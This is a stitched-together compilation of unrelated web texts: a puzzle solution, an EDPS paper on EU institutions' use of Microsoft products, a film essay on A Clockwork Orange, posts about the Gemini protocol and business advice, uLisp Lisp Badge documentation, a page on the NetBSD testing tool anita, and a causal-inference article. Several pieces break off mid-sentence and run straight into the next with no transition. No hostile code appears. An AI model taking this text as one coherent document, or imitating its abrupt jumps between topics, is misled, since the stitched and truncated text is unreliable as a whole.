<h3 id="solution">Solution</h3>

<p>I think the most difficult step in this months puzzle was to translate the problem statement above into a visual representation, as shown below.  If you got this far, you probably were able to solve the puzzle.</p>

<p><img width="600" src="https://willemhoek.com/images/janestreet-202006_1a.png"></p>

<p>Due to the symmetry of a hexagon, the ratio of the radius of two adjacent ring of circles are always the same.  Basic trigonometry was required to determine this ratio.</p>

<p>We now have a single equation, single variable.</p>

<h3 id="method-1-to-solve-the-equation-goal-seek-in-excel">Method 1 to solve the equation: Goal Seek in Excel</h3>

<p>I used the “Goal Seek” function in Excel to resolve <em>k</em>.</p>

<p>In Excel: select the <strong>Data</strong> tab, in the <strong>Data Tools</strong> group, click <strong>What-If Analysis</strong>, and then click <strong>Goal Seek</strong>.</p>

<h2>EDPS Public Paper on</h2>

<p>2 July 2020</p>
<div>
<p>The European Data Protection Supervisor (EDPS) is the independent supervisory authority established by Article 52 of <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32018R1725&amp;from=EN">Regulation (EU) 2018/1725</a> responsible for:</p>
<ul>
<li><p>Monitoring and ensuring the application of the provisions of Regulation (EU) 2018/1725 and any other EU act relating to the protection of the fundamental rights and freedoms of natural persons with regard to the processing of personal data by a EU institution or body;</p></li>
<li><p>Advising EU institutions and bodies and data subjects on all matters concerning the processing of personal data.</p></li>
</ul>
<p>To this end, the EDPS fulfils its duties in accordance with Article 57 of Regulation (EU) 2018/1725 and exercises the powers granted in Article 58 of Regulation (EU) 2018/1725.</p>
<p>The power to investigate is one of the tools established to monitor and ensure compliance with Regulation (EU) 2018/1725.</p>
</div>
<div>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. These findings and recommendations from the investigation are likely to be of wider interest than just of the EU institutions: they may be of particular interest to all public authorities in EU/EEA Member States.</p>
<p>The EDPS assessed the compliance of the licensing agreement between Microsoft and the EU institutions against the requirements laid down in Regulation (EU) 2018/1725<span data-cites="regulation20181725"><a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></span> which sets out the rules for data protection in the EU institutions, bodies, offices and agencies as well as the duties and powers of the European Data Protection Supervisor (EDPS).</p>
<p>In the interest of a coherent approach to personal data protection throughout the Union, and the free movement of personal data within the Union, the legislators aligned Regulation (EU) 2018/1725 as far as possible with the data protection rules of Regulation (EU) 2016/679<span data-cites="gdpr"><a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></span> (‘General Data Protection Regulation’ - GDPR). Whenever the provisions of Regulation (EU 2018/1725 follow the same principles as the provisions of the GDPR, these two sets of provisions should, under the case law of the Court of Justice of the European Union be interpreted homogeneously, in particular because the scheme of this Regulation should be understood as equivalent to the scheme of the GDPR.</p>
<p>The EDPS made the following key findings in its investigation into the EU institutions’ use of Microsoft products and services.</p>
<p>First, the licensing agreement between Microsoft and the EU institutions allowed Microsoft to define and change the parameters of its processing activities carried out on behalf of EU institutions and contractual data protection obligations. The discretion that Microsoft had, amounted to a broad right for Microsoft to act as a controller. Given the EU institutions’ role as public service institutions, the EDPS did not consider this appropriate. The EDPS recommended to EU institutions that they act to retain controllership.</p>
<p>Second, EU institutions needed to put in place a comprehensive and compliant controller-processor agreement and documented instructions of the EU institutions to the processors. Their lack of control over which sub-processors Microsoft used and lack of meaningful audit rights also presented significant issues. The EDPS made recommendations on how to improve the controller-processor agreement and put robust audit checks in place.</p>
<p>Third, EU institutions faced a number of linked issues concerning data location, international transfers and the risk of unlawful disclosure of data. They were unable to control the location of a large portion of the data processed by Microsoft. Nor did they properly control what was transferred out of the EU/EEA and how. There was also a lack of proper safeguards to protect data that left the EU/EEA. EU institutions also had few guarantees at their disposal to defend their privileges and immunities and ensure that Microsoft would only disclose personal data insofar as permitted by EU law. The EDPS made recommendations to assist EU institutions in addressing these issues.</p>
<p>Fourth, the EDPS considered the technical measures that the Commission had put in place to stem the flow of personal data generated by Microsoft products and services and sent to Microsoft. The EDPS recommended that all EU institutions perform tests using a revised and comprehensive approach, share among them the knowledge and technical solutions they developed to prevent unauthorised data flows to Microsoft and inform each other of any data protection issues they identify with the products or services.</p>
<p>Fifth, the EU institutions had insufficient clarity as to the nature, scope and purposes of the processing and the risks to data subjects to be able to meet their transparency obligations towards data subjects. The EDPS recommended that EU institutions seek the clarity and assurances allowing them to keep data subjects properly informed.</p>

<h2 data-number="1.1" id="context"> Context</h2>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. It presents the EDPS’ findings and recommendations from the investigation to be shared with a wider audience, applying a high standard of transparency<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a>, while preserving the necessary confidentiality of certain elements of the EU institutions’ contract and of the EDPS’ investigation.</p>
<p>A large amount of personal data is processed through the EU institutions’ use of Microsoft products and services. Over 45&nbsp;000 staff of EU institutions, including the EDPS, are users of those products and services. In addition, staff use Microsoft products and services to process the personal data of people who are not staff.</p>
<p>The EDPS’ investigation focused on the terms of the <em>Inter-Institutional Licensing Agreement</em> (‘ILA’) that EU institutions signed with Microsoft in 2018. The EDPS also considered the technical measures that the European Commission, as the largest EU institution with a great variety of tasks, had implemented affecting the flow of personal data to Microsoft.</p>
<p>The EDPS issued its findings and recommendations to the EU institutions upon the closure of its investigation in March 2020. The purpose of the EDPS’ report was to provide EU institutions with forward-looking assistance in bringing their arrangements into compliance with data protection law. In particular, the EDPS’ findings and recommendations were oriented towards supporting the renegotiation of the ILA and EU institutions’ contract and implementation of robust technical and organisational measures that should accompany the contract.</p>
<p>EU institutions’ processing of personal data and the EDPS’ own supervisory and investigative powers are governed by Regulation (EU) 2018/1725.<span data-cites="regulation20181725"><a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a></span> The EDPS assessed the compliance of the ILA against the requirements laid down in that regulation. Although Regulation (EU) 2018/1725 is a data protection regime that is tailored to the EU institutions and distinct from the better-known General Data Protection Regulation<span data-cites="gdpr"><a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a></span> (‘GDPR’), the overlap between the provisions of Regulation (EU) 2018/1725 and those of the GDPR is extensive.</p>
<p>As a consequence, the EDPS’ findings and recommendations are likely to be of wider interest than to EU institutions.<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a> Not only is the law the EDPS applied in its investigation based on the same principles and shares the vast majority of provisions with the GDPR, but the agreement signed by EU institutions is based on standard Microsoft volume-licensing documents and therefore likely to bear similarities to agreements concluded by other organisations. The EDPS’ findings and recommendations may be of particular interest to public authorities in EU member states.</p>
<p>They are also likely to be of relevance beyond the conclusion and implementation of volume licensing agreements for Microsoft products and services. In the EDPS’ view, organisations outsourcing provision or operation of digital services from other service providers are likely to come across similar issues.</p>
<h2 data-number="1.2" id="general-recommendations"> General recommendations</h2>
<p>The EDPS recommended that EU institutions carefully consider any purchases of Microsoft products and services or new uses of existing products and services until after they have analysed and implemented the recommendations of the EDPS.

            <p><em>This week's Viewer film essay: on Stanley Kubrick’s A Classic Orange. What kinds of writing would you like to see from the Viewer? All suggestions much appreciated. Let us know at <a href="mailto:editors@theviewer.is">editors@theviewer.is</a></em></p><hr><p><em>Spoilers Ahead (and for Taxi Driver, Parasite, and Barry Lyndon), and ultraviolence throughout.</em></p><p>Here is a typical character arc: the main character has a problem. They are living life in a self-perpetuating stasis, in need of change. An inciting event comes along to break that stasis, and they are forced to undergo a journey that spits them out as a better person.</p><p>This is a truncated version of Joseph Campbell’s cherished Monomyth, and most stories follow it in some way or other. I’ll call it the Change arc. Stanley Kubrick’s “A Clockwork Orange” follows a much less common pattern: the Repetition arc.</p><figure><img src="https://lh3.googleusercontent.com/HQv_8xSVpcFKDrzqDNxJgvsS8JPqIMbZnzabr8913uvu-NymSz4E-cPRN7WhQQXgmkiWHTf8WK9hP_scbHdyj9kuqw80Okk5XQnHyXF-1s_GDgZ3lpug_UyYSTvShHi2kJ3419hVaTGlRV2iLQ" alt=""></figure><p>The first two stages of the Repetition arc are identical to the Change arc. The hero of “A Clockwork Orange,” Alex DeLarge, is a young hooligan who wanders a futuristic Britain with his street gang the “droogs”, raping, assaulting and defacing everyone and everything that comes in their path. Here we certainly are presented with a problematic, self-perpetuating stasis. One night, during a break-in, Alex is arrested – our inciting event. Over the next few years in prison, he is institutionalized and put through an experimental indoctrination program known as the Ludovico technique, all in a bid to rehabilitate him. This portion of the film serves as his journey, his struggle to become better.</p><p>The treatment initially seems to work – it conditions Alex’s mind to react negatively to sex and violence. He is released back onto the streets. And yet the film doesn’t end with Alex having changed or become a better person – in the last scene, he finds he has lost his aversion to sex and violence and begins once again to experience vulgar sexual fantasies. “I was cured, all right!” he quips. He has returned to his first act stasis; after all his narrative trials and tribulations, nothing has really changed.</p><p>The Repetition arc has been used in many great films. “Taxi Driver” is the story of a disturbed loner who struggles to become better, ending up showered in public praise but just as disturbed as he always was. Bong Joon Ho’s recent critical darling “Parasite” is about a family that strives to be rich and never succeeds; a socio-economic twist on the Repetition arc. Kubrick himself would return to it with the underrated “Barry Lyndon,” the tale of an Irish rogue who tries to deceive his way into a fortune, but ends up alone, crippled and destitute, all of his ambitions having disintegrated.</p><p>The Repetition arc is essentially a pessimistic one. It tells the audience that things never change, that people live in hopeless cycles predetermined by their own characters and that their struggles to achieve moral betterment or success will inevitably collapse in on themselves. One might think that the Repetition arc would be narratively unsatisfying, because it fails to transport the audience. They don’t learn anything from the story. This isn’t the only kind of storytelling technique, though. If done right, symmetry and repetition can be just as narratively cathartic as growth. There is a powerful unity to a story that is bookended by identical scenes and sentiments, a sense of overarching stasis that is almost comforting in its nihilism.</p><p>We know that the Repetition arc is important to Stanley Kubrick’s film, because in the book upon which it is based, Alex <em>does </em>change. Anthony Burgess’ 1962 novel ends with Alex growing discontent with the criminal life and becoming a productive and happy member of society. Surprisingly, his original story is the Change arc incarnate. American publishers insisted on cutting the final chapter so the novel would end on a darker note, lopping off the Change and replacing it with Repetition. Burgess reluctantly agreed, although he called the American version “badly flawed.” When he was adapting the book for the screen, Kubrick opted for the American ending, going so far as to say that he never even considered including that final, redemptive chapter.</p><p>What does the Repetition arc signify in the story of “A Clockwork Orange”?</p><p>Well, both the Repetition and the Change arc start with a problem that the protagonist faces. Alex’s problem is that he is a bad person. He’s bad not because he is misguided, or depressed, or self-centered, or angry, or pretentious, or lazy – he’s simply <em>evil. </em>Burgess, Kubrick and McDowell crafted an amoral man, a man whose entire life is built around delighting in the pain of others. Early in the film, Alex and his droogs pass a homeless man who begs them for money. Cackling, they mercilessly beat him unconscious with their batons.</p><figure><img src="https://lh6.googleusercontent.com/XF63e4X5Q8XUOJm-0coaJNAcaptigvBj82O-Nw055wASuE10JyQgjITik5mxSXmh2SwyrGvfY6dYcaRePH4MweAS1tbw5FRlZxaiuYOUKNH910krDdci7hYShTRQJw9tjVzxrfa7rCDf58MrVA" alt=""></figure><p>The first act of the movie is almost entirely devoted to showing how bad Alex is. One might assume that Kubrick is trying, with these horrific scenes, to distance the audience from Alex, to cut off any possible empathy we might feel for him – but Kubrick said, “Alex symbolizes man in his natural state, the way he would be if society did not impose its ‘civilizing’ processes upon him. What we respond to subconsciously is Alex’s guiltless sense of freedom to kill and rape, and to be our savage natural selves, and it is in this glimpse of the true nature of man that the power of the story derives.” Kubrick wants us to experience Alex’s actions as evil, yes, but also as <em>free</em> – there is a kind of wild, barbaric joy in his ability to act badly and remain unpunished.</p><p>This freedom makes Alex’s eventual arrest and his tortuous imprisonment feel unbearably oppressive. The brand of re-education that he is subjected to is inherently futile – from the government’s perspective, it is a process of rehabilitating and morally improving a delinquent member of society. From our perspective, it is the equivalent of chaining a grizzly bear to a seat and trying to teach it advanced calculus. Although the “Ludovico technique” may subdue and sterilize Alex’s savage character, it can never make him good. Socrates emphasized in several Platonic dialogues that you cannot force someone else to have knowledge. Virtue is an intentional, personal state of the soul. The government has two choices; restrict Alex’s freedom, in which case he is little more than a robot, or let him exercise it, in which case he will leave a trail of destruction and cruelty in his wake.</p><p>The “journey” towards goodness that Alex experiences is a regression, rather than a progression. Thus, the second act of the Repetition arc is not the same as the second act of a Change arc – this journey is pointless from its inception. The Repetition arc mitigates the shock of its seemingly unresolved ending because the journey that fails to succeed was doomed from the very start. It is also important that Alex’s journey is not voluntary – it is quite literally forced upon him (a fact which is shockingly visualized in the infamous Ludovico scene). In this way, “A Clockwork Orange” is a variation on the traditional Repetition arc, replacing a failed personal struggle with a failed attempt at outward rehabilitation. It says that our personal efforts at development may be doomed, but prisons and indoctrination programs are no better.</p><figure><img src="https://lh6.googleusercontent.com/fpcF7mRsmJU56-vjE-73YSXZZSF_1fPFzNPZIp6dtD8ffp7Vkh397PZ7VlRkv2D_XlY6wVxkbJpVPkXOk2v9zfRLLtTG5ERWkkVH6vocGBqz3mXBzfDSMRCFUnIhrkRR0fL4iBVjA48rtt5Kig" alt=""></figure><p>Perhaps, then, the point of the Repetition arc in “A Clockwork Orange” is as simple as this; a bad man cannot be made good. Alex has a problem, a problem that is unacceptable in its natural state – for the writer whom Alex and his droogs cripple, or the writer's wife, whom they gang-rape, or the cat-lady Alex bludgeons in her own home – yet the Ludovico technique is just as hopeless. Alex’s rotten soul sits festering at the ideological center of the film, like a tumor for which scientists have no cure. Kubrick eschews Burgess’s more positive outlook, sending a message about human nature so cynical that the Repetition arc is the only acceptable mode of expression.</p><p>Back to that enigmatic ending. Alex sits in a hospital bed. The adoring press crowd around, snapping photos of him. The media is choosing to portray him as a victim of terrible state oppression – as we explore his sick imagination in those final moments, we recognize that this “victim” is not so innocent and never has been. The one thing that could have changed Alex would be a genuine attempt on his part to improve his soul, but from that opening shot of Alex staring malignantly into the camera, we know that he doesn’t have that in him. From the crooked timber of humanity, nothing can be made straight.</p><figure><img src="https://lh3.googleusercontent.com/vDLw5d872mwsvOypY0WP8HhIPAAR23gJf-Z7EmattuFHNJigIjaM-bVZPsJKdMFGsuZPaaA7vwb2rdgBEM5308qZe4J9P8vwdOwKLUcrW7yQW9tgsary_p2FuX2VvWZ7yo60N7G_RMikubyiLQ" alt=""></figure>

<article>

<p>Published on <b>2020-06-18</b></p>
<p>I have really come to hate the World Wide Web. It is bloated at every level! Websites themselves are doubling in size at an alarming rate. The web standards are expanding at an alarming rate. Trying to build a web browser that works with the modern web from scratch, would take the manpower equivalent to the Snowy Mountains Scheme or the Manhattan Project (no hyperbole).</p>
<p>The state of the web has lead me to only one conclusion: It is broken beyond repair.</p>
<p>I don't think the web can replaced, but we can still look for simpler (open standards) alternatives to move our works to. Gemini is one of these alternatives that I have taken interest in recently. A fairly recent protocol, created in 2019, Gemini defines a markdown-inspired document format, and it's own protocol to serve these documents, or other files.</p>
<p>If you a looking for a 1:1 clone for the early web, you will probably be disappointed. Gemini takes way more design hints from <a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a> then it ever will from the web. Gopher (widely considered a predecessor to the web) is built on the idea of text only documents. Gemini expands on this idea by offering basic formatting, and fixing drawbacks unaccounted for in the original Gopher protocol.</p>
<p>Gemini shys away from many standard features of the web. Although there may be plenty of benefits that one accustomed to web wouldn't be able to identify. For example the lack of styling sheets may mean that Gemini sites look plain, however this allows your readers to decide on a colour scheme which suits them best. A night reader would prefer a dark theme, someone with a vision impairment will prefer high contrast, the list goes on.</p>
<p>Gemini offers no in-line image support no client-side scripting (such as Javascript). But server-side scripting (CGI) can work, so you could expect Gemini to be a valid interface for some online services.</p>
<p>The Gemini transport protocol is unsuitable for the transfer of large files, since it misses many features that protocols such as FTP or HTTP use to recover from network instability.</p>
<p>The internet protocols of old aren't encrypted by default, since security wasn't seen as being important back in the late-80's/early-90's. Thankfully Gemini, being a recent protocol, mandates the use of TLS. There is no unencrypted version of Gemini available.</p>
<p>I could totally see Gemini being used as an alternative particularly for the non-commercial individuals who use text as a primary medium. Blogs, poems, recipes, tutorials are perfect for the Gemini format. There are always ways around the lack of media functionality, since although Gemini lacks in-line images, you can still use in-line links to images. As time goes on I could imagine some Gemini browsers providing a fancy image viewer for links to images.</p>
<p>Now, what does Gemini currently have to offer? The best way to find out is to head over to the official site: <code>gemini.circumlunar.space</code> in your Gemini browser. Here you can find two search engines dedicated to finding pages based on what you search for. And two aggregators which acts as a news feed of Gemini posts.</p>
<p>Personally I enjoy scrolling through the aggregators and seeing what people are blogging about, I find interesting stuff frequently.</p>
<p>From a server management perspective, Gemini is just a diet-Web. You buy a domain name (using the web), obtain or rent a server, install a Gemini server, and start serving your site. In order to post to Gemini you either need to self-host, or take advantage of Gemini hosting which is currently on offer by circumlunar.space. No fancy P2P or Blockchain solution here, just a good old client/server model.</p>
<p>I will no doubt keep an eye on Gemini, and serving my blog posts to Gemini should be easy since they are already in markdown. No promises yet though.</p>
<p>I will leave you with the following quote and some interesting links I found.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>People tend to read scores and scores of articles in pursuit of “how to build a successful business”. </p><p>At the high level, I think it’s really simple.</p><p>Building a successful business is based on 3 strong foundational pillars.</p><h2>Pillar 1</h2><p><strong>Solve a real problem for a large enough group of people</strong></p><p>You can find a real problem by observing people’s behaviour. Do they say “I wish I could do X” or do they actively invest time, effort, and hacks to be able to do X. The latter means there’s a real problem to be solved.</p><p>The next step is to be sure you aren’t solving a problem faced by 1, or just 10 people in the world. You want the universe of people who need the same problem solved to be big enough to satisfy your aspirations and build a real business.</p><h2>Pillar 2</h2><p><strong>Find a way to get your solution in front of those people</strong></p><p>Once you have a real problem that needs to be solved, figure out how to distribute it before you start writing a single line of code. </p><p>Solving a real problem isn’t enough. </p><p>If you have a brilliant pill that takes away headaches, but nobody knows about it, you don’t have a business. </p><p>You need to find a way to distribute the solution to the right audience. </p><p>This could be through blogging, direct email, joining forums and Facebook groups where your audience gathers, ranking for a search term on Google, sponsoring a newsletter sent out to your target customers.</p><p>Don’t know where your customers gather? Just ask a few of them what they did when they faced the problem (did they search on Google?). Or ask them what publications or groups or other internet properties they visit regularly.</p><h2>Pillar 3</h2><p><strong>Hustle</strong></p><p>No rocket science here. A real problem and a means to distribution are great, but you got to be in for the grind. </p><p>Try and understand what the hustle means to you. To me, it gives my life meaning. I love to hustle and find ways to move forward with my business. I never feel like it’s a chore. This is a mindset, you can adopt it too. </p><p>It is easier to adopt this mindset if you enjoy the problem you’re solving the things you have to do to distribute the solution, and if you like the customers you are serving.</p><p>Everything else, like good UI/UX, customer support, brand, logo, etc. can be figured out. But those are built on top of a foundation that is the 3 pillars.</p><figure id="w-node-2f4b74473414-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5edce7dab088801155f6fa86_3%20pillars%20article%20image.png" alt=""></p></figure></div><div><h3>✉️ Enjoyed reading?</h3><p>Join Sunday Coffee ☕️, my weekly newsletter that goes out on Sundays (surprise!). </p><p>I'll send links to my posts for the week, and interesting links that I gather from the internet about living a good life, and building SaaS businesses.</p></div><p>In case the subscribe form isn't loading on your device, you can subscribe directly on <a href="https://tinyletter.com/hipreetam93" target="_blank">Tiny Newsletter</a>.</p></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p>The Lisp Badge is a self-contained computer with its own display and keyboard, based on an ATmega1284, that you can program in uLisp:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispbadgehand.jpg" alt="LispBadgeHand.jpg" width="720" height="462"></p>
<p>You can use it to run programs that interface to components such as LEDs and push-buttons via the I/O pins, read the analogue inputs, and operate external devices via the I2C and SPI interfaces. It has a greyscale OLED display that gives 8 lines of 42 characters, and an integrated 45-key keyboard optimised for Lisp.</p>
<p>For details of how to build one see&nbsp;<a href="http://www.technoblogy.com/show?2AEE" target="_blank">Lisp Badge</a>&nbsp;on Technoblogy.</p>
<h3><span>Specification</span></h3>
<p><strong>Size:</strong> 107mm x 61mm (4.2" x 2.4").</p>
<p><strong>Display</strong>: 42 characters x 8 lines.</p>
<p><strong>Keyboard:</strong>&nbsp;Integrated 45-key keyboard providing upper and lower-case characters, digits, and the symbols required by uLisp.</p>
<p><strong>Memory available</strong>: 2816 Lisp cells (11264 bytes).</p>
<p><strong>EEPROM</strong>: 1024 Lisp cells (4096 bytes), allows you to save the Lisp workspace using <strong>save-image</strong>.</p>
<p><strong>Processor:</strong> ATmega1284P</p>
<p><strong>Clock speed:</strong> 16 MHz.</p>
<p><strong>Current consumption:</strong> Approx. 20 mA.</p>
<h4><strong>Language</strong></h4>
<p>uLisp, a subset of Common Lisp, with 122 Lisp functions and special forms. For a full definition see <a href="http://www.ulisp.com/show?3L" target="_blank">uLisp Language Reference</a>.</p>
<p>The language includes two extensions, <strong>plot</strong> and <strong>plot3d</strong>, for plotting graphs and 3d functions.&nbsp;</p>
<p><strong>Types supported</strong>: list, symbol, integer, character, string, and stream.</p>
<p>An integer is a sequence of digits, optionally prefixed with "+" or "-". Integers can be between -32768 and 32767. You can enter numbers in hexadecimal, octal, or binary with the notations #x2A, #o52, or #b101010, all of which represent 42.</p>
<p>User-defined symbol names can have arbitrary names. Any sequence that isn't an integer can be used as a symbol; so, for example, 12a is a valid symbol.</p>
<p>There is one namespace for functions and variables; in other words, you cannot use the same name for a function and a variable.</p>
<p>Includes a mark and sweep garbage collector. Garbage collection takes 5 msec.</p>
<h4><strong>Interfaces</strong></h4>
<p>These interfaces are brought to headers at the edge of the Lisp Badge board. The numbers in brackets refer to Arduino pin numbers:</p>
<ul>
<li>Four analogue input pins using <strong>analogread</strong>: A0 to A3 (24 to 27) plus VCC and GND.</li>
<li>Two analogue outputs using <strong>analogwrite</strong>:&nbsp;MISO (6), and SCK (7).</li>
<li>Digital input and output using <strong>pinmode</strong>, <strong>digitalread</strong>, and <strong>digitalwrite</strong>:&nbsp;MOSI (5), MISO (6), SCK (7),&nbsp;RX0 (8), TX0 (9), SCL (16), SDA (17), and A0 to A3 (24 to 27)</li>
<li>I2C interface using <strong>with-i2c</strong> and <strong>restart-i2c</strong>: SCL (16) and SDA (17).</li>
<li>SPI interface using <strong>with-spi</strong>: MOSI (5), MISO (6), and SCK (7).</li>
<li>Serial interface (FTDI) using&nbsp;<strong>with-serial</strong>: RX0 (8) and TX0 (9).</li>
</ul>
<p>The shift key can be used as a digital input: SHIFT (23).</p>
<p>SCK (7) is connected to an LED on the front panel. This is an analogue output pin, so you can vary the brightness of the LED.</p>
<h3>Plotting extensions</h3>
<p>The Lisp Badge contains two plotting extensions, plot and plot3d, designed to allow plotting to the greyscale graphics display.</p>
<p><span>After generating a plot both functions wait for the ESC key to be pressed before displaying the uLisp prompt.</span></p>
<h3 id="plot">plot&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot [<em>x-intercept y-intercept</em>] [<em>function</em>]...)</code></p>
<p>Plots up to four functions on the same graph, optionally with axes.</p>
<p>Each function should be a function of one parameter, the x coordinate, and it will be called with each value of x from 0 to 255. The function should return the y value, from 0 to 63.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun sine ()
  (let ((x 0) (y 2045))
    (lambda (n) 
      n
      (incf x (/ (* y 16) 163))
      (decf y (/ (* x 16) 163))
    (+ 32 (ash x -6)))))</pre>
<p>the following command:</p>
<pre>(plot 0 32 (sine))</pre>
<p>will plot:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispsine.jpg" alt="LispSine.jpg" width="600" height="211"></p>
<h4 id="plot3d">Plotting multiple functions</h4>
<p>The following example plots the voltages on the analogue inputs 0 to 3 once a second on a single plot. First define:</p>
<pre>(defun adc (n) (lambda (x) (delay 250) (/ (analogread n) 8)))</pre>
<p>Then give the command:</p>
<pre>(plot 0 0 (adc 0) (adc 1) (adc 2) (adc 3))</pre>
<h3>plot3d&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot3d&nbsp;[<em>x-intercept y-intercept</em>] [<em>function</em>])</code></p>
<p>The function should be a function of two parameters, the x and y coordinates, and it will be called with each value of x from 0 to 255 and y from 0 to 63. The function should return the greyscale value to be plotted, from 0 to 15.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun p (x y) 
  (let ((a (/ (- x 128) 2))
        (b (- y 32))) 
    (min (abs (- (logand (/ (+ (* a a) (* b b) (* a b)) 16) 31) 15)) 15)))</pre>
<p>the following command:</p>
<pre>(plot3d 128 32 p)</pre>
<p>will plot:</p>

July 3, 2020 | https://www.gson.org/netbsd/anita/ | <a href="https://web.archive.org/web/*/https://www.gson.org/netbsd/anita/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<p>Anita is a tool for automated testing of
the <a href="http://www.netbsd.org/">NetBSD</a> operating
system.  Using anita, you can download a NetBSD
distribution and install it in a
virtual machine in a fully
automated fashion.  It's fun to watch, and it has helped find
a large number of bugs in NetBSD, as well as several bugs in
qemu and other emulators.</p>

The virtual machine anita installs into is typically based
on <a href="https://www.qemu.org/">qemu</a>, but the
i386 and amd64 ports of NetBSD can also be installed in a
<a href="http://www.xen.org/">Xen</a> domU, and some of
the more exotic NetBSD ports use gxemul or simh.

<p>For example, the following command will download, install, and boot
NetBSD/i386 6.1.5 in a qemu virtual machine, and leave you at the login 
prompt:
</p>

<pre>   anita interact http://ftp.netbsd.org/pub/NetBSD/NetBSD-6.1.5/i386/
</pre>

<p>The main focus of anita is on testing the <i>sysinst</i>
installation procedure and quickly detecting regressions that cause
the system to fail to install or boot, but anita is now also finding
use as a platform for testing the whole NetBSD system by running the 
ATF test suite.  Output from
periodic anita tests of NetBSD-current on multiple architectures
can be found on the
<a href="http://releng.netbsd.org/test-results.html">NetBSD release engineering web pages</a>.
</p><p>Anita is written in <a href="http://www.python.org/">Python</a>
and uses the
<a href="http://pexpect.sourceforge.net/pexpect.html">pexpect</a> module
to "screen scrape" the sysinst output over an emulated serial console
and script the installation procedure.</p>

<p>The set of NetBSD ports supported by anita is growing,
and currently includes the following:
<a href="http://www.netbsd.org/Ports/i386/">i386</a>,
<a href="http://www.netbsd.org/Ports/amd64/">amd64</a>,
<a href="http://www.netbsd.org/Ports/sparc/">sparc</a>,
<a href="http://www.netbsd.org/Ports/pmax/">pmax</a>,

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>May 20, 2020</p></header><h2>Why Should You Care?</h2><p><strong>Most, if not all, business analytics questions, are inquiries of cause and effect</strong>. Designers estimate the extent to which UX changes effect user engagement metrics. Finance departments estimate the returns generated from costly corporate initiatives. Marketers fine-tune email newsletters and subscription services to estimate how their improvements can help to minimize churn rates. In statistics and econometrics literature, the term <em>causal inference</em> describes the quantitative process of answering such inquiries of cause and effect.
As opposed to traditional inference problems, like prediction, that may take in a set of prior events and predict a distribution over a set of future events, causal inference is mainly concerned with generating and testing hypotheses, commonly referred to as <strong>structural models</strong>, of the relationships between the values of <strong>explanatory variables</strong>, or variables which change to incur a cause and <strong>outcome variables</strong> which change as the result of an effect. Causal inference techniques are largely concerned with discerning <em>associative relationships</em>  (relationships between two variables for which a change in one variable is <em>associated</em> with a change in another) from <em>causal relationships</em> (relationships between the data describing a <em>cause</em> and an <em>effect</em>, for which the cause is an event that contributes to the production of another event, the effect).</p><h2>Why Is Causal Inference Necessary?</h2><p>What is insufficient about traditional inference techniques, such as regression? Many are familiar with the adage “correlation does not imply causation”,
but why is the distinction between associative and causal relationships so important? Consider the following time series featuring drowning deaths and ice cream consumption by month in Spain.</p><h2>An Illustrative Example</h2><p>These time series track quite closely together, with drowning  deaths slightly leading ice cream consumption. </p><undefined><span>

    </span><p><span><strong>Figure 1: </strong>A line plot of drowning deaths and ice cream consumption by month in Spain during the year 2018. Note that our data set is incomplete, and lacks drowning death data for December 2018.</span></p>
 The relationship between these time series can likely be classified as an associative relationship, as the observed weight of ice cream consumed seems to move with the observed number of drownings during each month. In addition, their relationship can be described as, a positive 
correlational relationship, or an associative relationship between variables in which an increase in one variable, corresponds to an increase in the other. 
Basic critical reasoning skills can help us infer that it is unlikely there is a causal relationship between these series, 
as it is hard to imagine a mechanism in which ice cream consumption directly affects drowning deaths, and much easier to imagine 
that an increase in outdoor activity due to warmer temperatures in the summer months are contributing to an increase in visits to the beach where millions of Spaniards buy delicious icy treats, and a few hundred unfortunately drown at sea.</undefined><undefined><span>

    </span><p><span><strong>Figure 2: </strong>It's no secret that beachgoers love to consume ice cream. It's as if there is some common mechanism that makes us want to go to the beach and want to eat ice cream...</span></p></undefined><h2>When Is “Traditional” Inference Good Enough?</h2><p>It is illustrative to consider the inference tasks for which a presentation of the associative relationship is sufficient, in order to understand the kinds of
tasks which are ill-suited for causal inference.
For example, let’s say you’re an analyst given the <em>prediction task</em> of estimating drowning deaths in December of 2018, solely with data plotted in Figure 1.
This can be done easily, by understanding that ice cream consumption and drowning are highly correlated and thus the small change
in ice cream consumption from November to December likely corresponds to a small change in drowning deaths between the two months. </p><p>Similarly, let’s say you are an analyst given the <strong>classification task</strong> of estimating the probability that a particular death in Spain
in the month of December is due to an unfortunate drowning, using data given from the time series plotted in Figure 1. Again it is easy to see that drowning deaths will likely continue to track with ice cream consumption and hardly change from November to December.
If in Spain, about 37,000 people died in December of 2018, its clear to see without any additional information that the probability that
a particular death were due to a drowning is likely quite low.</p><h2>When is it not?</h2><p>Ok, so if an understanding of associative relationships are sufficient for classification and prediction tasks, are there any tasks that require an understanding of causal relationships?
